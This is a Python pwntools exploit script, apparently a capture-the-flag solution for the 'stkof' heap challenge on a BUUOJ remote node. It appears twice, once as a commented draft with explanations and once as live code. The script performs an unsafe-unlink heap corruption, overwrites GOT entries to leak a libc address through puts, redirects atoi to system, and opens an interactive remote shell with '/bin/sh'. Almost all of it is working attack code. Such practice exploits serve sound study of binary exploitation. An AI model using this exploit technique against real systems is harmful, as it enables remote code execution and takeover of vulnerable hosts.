# from pwn import *
# from LibcSearcher import *

# context.arch = 'amd64'
# context.log_level = 'debug'

# elf = ELF('../stkof')
# target = remote('node4.buuoj.cn', 29201)

# # Because the index starts at one.
# # So our first chunk starts at .bss + 0x8...
# # But we still could write at index 0.
# chunk2 = 0x602150
# fd = chunk2 - 0x18
# bk = chunk2 - 0x10

def allocate(size):
  target.sendline('1')
  target.sendline(str(size))
  target.recvuntil('OK\n')

def free(index):
  target.sendline('3')
  target.sendline(str(index))

def edit(index, size, content):
  target.sendline('2')
  target.sendline(str(index))
  target.sendline(str(size))
  target.send(content)
  target.recvuntil('OK\n')

# free_got = elf.got['free']
# atoi_got = elf.got['atoi']
# puts_got = elf.got['puts']
# puts_plt = elf.plt['puts']

# allocate(0x100) # 1
# allocate(0x30)  # 2 if the content is lower than 0x30 than we cannot add the fake chunk into that chunk :()
# allocate(0x80)  # 3

# # We construct a fake chunk in chunk 2.
# # prev_size = 0, size = 0x20 -> prev_inuse = false, fd, bk, next_size = 0x20 -> prevent size check.
# # [... overflow chunk 3's header] prev_size = 0x30. size -> 0x90 to let the chunk be added to small bin list.
# fake_chunk = (p64(0x0) + p64(0x20) + p64(fd) + p64(bk) + p64(0x20)).ljust(0x30, b'a') + p64(0x30) + p64(0x90)
# edit(2, len(fake_chunk), fake_chunk)
# # Unlink! 
# free(3)

# # Now *chunk = &chunk - 0x18 => addr: 0x602150 content: 0x602138
# # So when write something into chunk 1, we are writing to content on address 0x602138.
# payload = p64(0) + p64(free_got) + p64(puts_got) + p64(atoi_got)
# edit(2, len(payload), payload)

# # After that, the memory at 0x602140 - 0x602158: free_got, puts_got [chunk 1 can modify this], atoi_got [chunk 2 can modify this]
# # We can thus use chunk 0 (offbyone) to replace free_got to puts_got.
# payload = p64(puts_plt)
# edit(0, len(payload), payload)
# # Now free becomes puts.

# # Let us try to delete a chunk.
# free(1) # => puts(0x602148) => puts(puts_got) => puts_addr.

# puts_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
# libc = LibcSearcher('puts', puts_addr)
# libc_base = puts_addr - libc.dump('puts')

# system = libc_base + libc.dump('system')
# payload = p64(system)
# edit(2, len(payload), payload) # Atoi becomes system.

# # If the option is read, then it will invoke system(input)
# target.sendline('/bin/sh\x00')
# target.interactive()

from re import A
from pwn import *
from LibcSearcher import *

context(log_level='debug', arch='amd64')

target = remote('node4.buuoj.cn', 29815)
elf = ELF('../stkof')

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']

chunk2_addr = 0x602150
fd = chunk2_addr - 0x18
bk = chunk2_addr - 0x10

def allocate(size):
  target.sendline('1')
  target.sendline(str(size))
  target.recvuntil('OK\n')

def free(index):
  target.sendline('3')
  target.sendline(str(index))

def edit(index, size, content):
  target.sendline('2')
  target.sendline(str(index))
  target.sendline(str(size))
  target.send(content)
  target.recvuntil('OK\n')

allocate(0x100) # chunk 1
allocate(0x30) # chunk 2
allocate(0x80) # chunk 3

fake_chunk = (p64(0x0) + p64(0x20) + p64(fd) + p64(bk) + p64(0x20)).ljust(0x30, b'a') + p64(0x30) + p64(0x90)
edit(2, len(fake_chunk), fake_chunk)

free(3) # Merged.

payload = p64(0x0) + p64(free_got) + p64(puts_got) + p64(atoi_got)
edit(2, len(payload), payload)

edit(0, len(p64(puts_plt)), p64(puts_plt))
free(1)

puts_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')

edit(2, len(p64(system)), p64(system))

target.sendline('/bin/sh\x00')
target.interactive()
